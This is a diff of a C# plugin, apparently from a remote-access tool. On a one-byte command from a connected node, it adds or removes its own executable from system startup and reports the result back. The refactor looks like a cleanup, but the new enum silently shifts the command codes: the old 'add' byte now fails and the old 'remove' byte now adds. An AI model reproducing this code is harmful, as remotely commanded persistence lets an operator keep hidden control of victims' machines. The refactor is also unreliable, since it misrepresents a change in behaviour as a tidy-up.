@@ -18,46 +18,49 @@ namespace Plugin
 {
     public class Main
     {
+        enum StartupAction { None, Add, Remove }
+        enum StartupResult { Failure, Success }
+
         public async Task Run(Node node)
         {
-            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
-            string executablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
-            byte[] data = await node.ReceiveAsync();
-            if (data == null || data.Length != 1)
+            try
             {
-                node.Disconnect();
-                return;
-            }
-            else if (data[0] == 0)
-            {
-                if (Utils.IsAdmin())
+                await node.SendAsync(new byte[] { 3 }); // indicate that it has connected
+                string executablePath = Assembly.GetEntryAssembly().Location;
+                byte[] data = await node.ReceiveAsync();
+
+                if (data == null || data.Length != 1)
                 {
-                    if (await Utils.AddToStartupAdmin(executablePath))
-                    {
-                        await node.SendAsync(new byte[] { 1 });
-                    }
-                    else
-                    {
-                        await node.SendAsync(new byte[] { 0 });
-                    }
+                    node.Disconnect();
+                    return;
                 }
-                else
-                {
-                    if (await Utils.AddToStartupNonAdmin(executablePath))
-                    {
-                        await node.SendAsync(new byte[] { 1 });
-                    }
-                    else
-                    {
-                        await node.SendAsync(new byte[] { 0 });
-                    }
-                }
+
+                StartupAction action = (StartupAction)data[0];
+                StartupResult result = await HandleStartupAction(executablePath, action);
+                await node.SendAsync(new byte[] { (byte)result });
+
+                await Task.Delay(1000); // Simulate some asynchronous operation
             }
-            else if (data[0] == 1) 
+            catch (Exception ex)
             {
-                await Utils.RemoveStartup(executablePath);
+                Console.WriteLine($"Error in Run: {ex.Message}");
+                await node.SendAsync(new byte[] { (byte)StartupResult.Failure });
             }
-            await Task.Delay(1000);
+        }
+
+        private async Task<StartupResult> HandleStartupAction(string executablePath, StartupAction action)
+        {
+            switch (action)
+            {
+                case StartupAction.Add:
+                    bool added = Utils.IsAdmin() ? await Utils.AddToStartupAdmin(executablePath) : await Utils.AddToStartupNonAdmin(executablePath);
+                    return added ? StartupResult.Success : StartupResult.Failure;
+                case StartupAction.Remove:
+                    await Utils.RemoveStartup(executablePath);
+                    return StartupResult.Success;
+                default:
+                    return StartupResult.Failure;
+            }
         }
     }
 }
